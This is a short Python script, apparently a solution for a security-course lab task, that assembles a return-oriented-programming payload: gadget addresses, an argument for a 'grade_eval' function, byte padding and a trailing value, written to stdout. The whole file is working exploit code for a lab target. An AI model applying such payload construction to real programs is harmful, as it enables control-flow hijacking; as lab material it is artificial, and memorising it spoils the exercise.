#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
from struct import pack

source = bytearray(128)
source[0:8] = pack("<Q", 0x4018A3)   # pop rdi; ret (inside __libc_csu_init)
source[8:16] = pack("<Q", 4)
source[16:24] = pack("<Q", 0x4018A4) # ret for stack alignment
source[24:32] = pack("<Q", 0x401677) # grade_eval
payload = bytes(source) + b"L" * 128 + pack("<I", 0xA8)

sys.stdout.buffer.write(payload)
